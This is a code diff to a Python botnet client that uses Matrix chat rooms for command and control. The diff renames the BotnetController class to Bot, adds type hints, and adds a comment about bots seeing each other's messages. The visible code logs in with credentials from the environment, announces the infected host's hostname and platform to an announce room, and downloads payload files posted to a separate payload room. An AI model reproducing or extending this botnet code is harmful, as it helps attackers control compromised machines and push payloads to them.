@@ -11,14 +11,14 @@ import sys
 from dotenv import load_dotenv
 
 load_dotenv()
-MATRIX_HOMESERVER = "https://matrix.org"
 USER_NAME = os.getenv('USER_NAME')  
 PASSWORD = os.getenv('PASSWORD')
 ROOM_ID = os.getenv('ROOM_ID')
 PAYLOAD_ROOM_ID = os.getenv('PAYLOAD_ROOM_ID')
+MATRIX_HOMESERVER = "https://matrix.org"
 MATRIX_DOWNLOAD_PREFIX = "https://matrix-client.matrix.org/_matrix/client/v1/media/download/"
 
-class BotnetController:
+class Bot:
     access_token: str
     announce_room: Room
     command_room: Room
@@ -63,7 +63,7 @@ class BotnetController:
             f"CONNECT:{self.get_system_info()}"
         )
         
-    def download_file(self, event, download_dir="downloads"):
+    def download_file(self, event, download_dir="downloads") -> str:
         content = event["content"]
         filename = content.get("body", "payload_file")
         filepath = os.path.join(download_dir, filename)
@@ -93,7 +93,7 @@ class BotnetController:
         )
         self.download_file(payload_event["chunk"][0])
         
-    def get_system_info(self):
+    def get_system_info(self) -> str:
         return json.dumps({
             "hostname": socket.gethostname(),
             "platform": platform.system(),
@@ -104,6 +104,7 @@ class BotnetController:
         })
         
     def on_announcement(self, room, event):
+        # not good that bot can see other bot's messages
         msgbody: str = event["content"]["body"]
         if not msgbody.startswith("RESOLVE"):
             return
@@ -134,5 +135,5 @@ class BotnetController:
         
 
 if __name__ == "__main__":
-    controller = BotnetController()
-    controller.run()
+    bot = Bot()
+    bot.run()
